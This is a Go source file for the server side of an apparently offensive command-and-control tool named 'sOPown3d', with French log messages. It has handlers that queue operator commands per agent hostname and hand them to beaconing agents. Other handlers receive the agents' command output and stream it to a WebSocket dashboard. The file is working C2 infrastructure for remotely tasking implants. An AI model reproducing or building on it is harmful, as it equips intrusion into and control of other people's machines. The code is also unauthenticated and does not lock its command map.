package server

import (
	"encoding/json"
	"fmt"
	"net/http"
	"time"

	"sOPown3d/pkg/shared"

	"github.com/gorilla/websocket"
)

func (server *Server) handleDashboard(w http.ResponseWriter, r *http.Request) {
	data := shared.DashboardData{
		AgentInfo:    "AgentID à voir comment récupérer dynamiquement",
		DefaultAgent: "Nicolass-MacBook-Pro.local",
	}

	if err := server.templates.ExecuteTemplate(w, "dashboard.html", data); err != nil {
		http.Error(w, "template error", http.StatusInternalServerError)
		fmt.Println("Erreur template:", err)
		return
	}
}

func (server *Server) handleBeacon(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "POST seulement", http.StatusMethodNotAllowed)
		return
	}

	var agentInfo shared.AgentInfo
	if err := json.NewDecoder(r.Body).Decode(&agentInfo); err != nil {
		http.Error(w, "bad json", http.StatusBadRequest)
		return
	}

	now := time.Now().Format("15:04:05")
	agentID := agentInfo.Hostname

	if cmd, ok := server.pendingCommands[agentID]; ok {
		_ = json.NewEncoder(w).Encode(cmd)
		delete(server.pendingCommands, agentID)
		fmt.Printf("[%s] → Envoyé à %s: %s\n", now, agentID, cmd.Action)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	_, _ = w.Write([]byte(`{}`))
}

func (server *Server) handleSendCommand(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "POST seulement", http.StatusMethodNotAllowed)
		return
	}

	var cmd shared.Command
	if err := json.NewDecoder(r.Body).Decode(&cmd); err != nil {
		http.Error(w, "bad json", http.StatusBadRequest)
		return
	}

	if cmd.ID == "" || cmd.Action == "" {
		http.Error(w, "id and action required", http.StatusBadRequest)
		return
	}

	server.pendingCommands[cmd.ID] = cmd
	fmt.Printf("[!] Commande pour %s: %s\n", cmd.ID, cmd.Action)

	w.Header().Set("Content-Type", "application/json")
	_, _ = w.Write([]byte(`{"status":"ok"}`))
}

func (server *Server) handleIngest(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "POST seulement", http.StatusMethodNotAllowed)
		return
	}

	var payload struct {
		AgentID string `json:"agent_id"`
		Output  string `json:"output"`
	}

	if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
		http.Error(w, "bad json", http.StatusBadRequest)
		return
	}

	fmt.Printf("> agent_id=%s,\n output=%q\n", payload.AgentID, payload.Output)

	server.wsMu.RLock()
	conn, ok := server.wsClients[payload.AgentID]
	server.wsMu.RUnlock()

	if ok {
		fmt.Println("📡 Envoi WS à", payload.AgentID)
		if err := conn.WriteMessage(websocket.TextMessage, []byte(payload.Output)); err != nil {
			fmt.Println("WS write error:", err)
		}
	} else {
		fmt.Println("⚠️ Aucun WS pour", payload.AgentID)
	}
}

func (server *Server) handleWebSocket(w http.ResponseWriter, r *http.Request) {
	agentID := r.URL.Query().Get("agent")
	if agentID == "" {
		http.Error(w, "missing agent", http.StatusBadRequest)
		return
	}

	fmt.Println("🛰️ Nouveau WS pour agent:", agentID)

	conn, err := server.upgrader.Upgrade(w, r, nil)
	if err != nil {
		fmt.Println("Erreur upgrade WS:", err)
		return
	}

	server.wsMu.Lock()
	server.wsClients[agentID] = conn
	server.wsMu.Unlock()

	defer func() {
		server.wsMu.Lock()
		delete(server.wsClients, agentID)
		server.wsMu.Unlock()
	}()

	for {
		if _, _, err := conn.ReadMessage(); err != nil {
			fmt.Println("WS read error:", err)
			return
		}
	}
}
